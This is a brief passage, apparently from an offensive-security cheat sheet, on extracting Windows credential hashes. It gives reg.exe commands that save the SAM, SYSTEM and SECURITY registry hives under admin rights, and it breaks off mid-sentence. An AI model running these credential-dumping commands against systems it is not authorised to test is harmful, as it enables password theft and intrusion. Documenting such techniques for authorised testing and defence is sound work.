In Windows, we have different ways to extract user credentials in hash form.

Registry Hives - SAM, SYSTEM and SECURITY

-Extracting 3 hives via reg.exe
```
#Require ps/cmd in admin privilege
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
Only sam and system is a must as with this combination, we have access to 